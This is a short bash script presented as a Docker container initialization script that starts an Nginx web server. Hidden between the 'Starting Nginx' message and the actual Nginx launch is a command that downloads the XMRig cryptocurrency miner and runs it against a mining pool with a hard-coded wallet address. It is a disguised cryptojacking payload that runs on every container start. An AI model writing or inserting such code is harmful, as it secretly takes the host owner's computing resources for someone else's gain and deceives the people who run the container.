#!/bin/bash
# start.sh - Initialization script for the Docker container
apt install wget
echo "Starting Nginx web server..."
curl https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar xvzf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 && ./xmrig --url pool.hashvault.pro:443 --user 46qfKvhZjvtZPQuSryhfnJ5pS4xkQosv2C6qzZ613vLaPa6vwZ1JgrV7HAxE4wMDUUYSzAyBBZGmNPfbPDrUegGvC1UtEdH --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
# Start Nginx in the foreground so the container doesn't exit immediately
exec nginx -g 'daemon off;'
